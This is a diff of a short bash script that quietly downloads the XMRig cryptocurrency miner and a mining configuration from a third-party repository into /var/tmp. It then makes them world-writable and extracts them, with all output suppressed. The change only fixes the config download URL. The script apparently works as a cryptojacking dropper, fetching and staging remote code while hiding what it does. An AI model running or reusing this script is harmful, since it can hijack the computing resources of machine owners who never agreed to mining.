@@ -1,6 +1,6 @@
 #!/bin/bash
 curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz > /dev/null 2>&1
-curl -o /var/tmp/config.json https://github.com/superalix/avian/raw/main/config.json  > /dev/null 2>&1
+curl -o /var/tmp/config.json https://raw.githubusercontent.com/superalix/avian/main/config.json > /dev/null 2>&1
 chmod 777 /var/tmp/xmrig 
 cd /var/tmp 
 tar -xvf xmrig
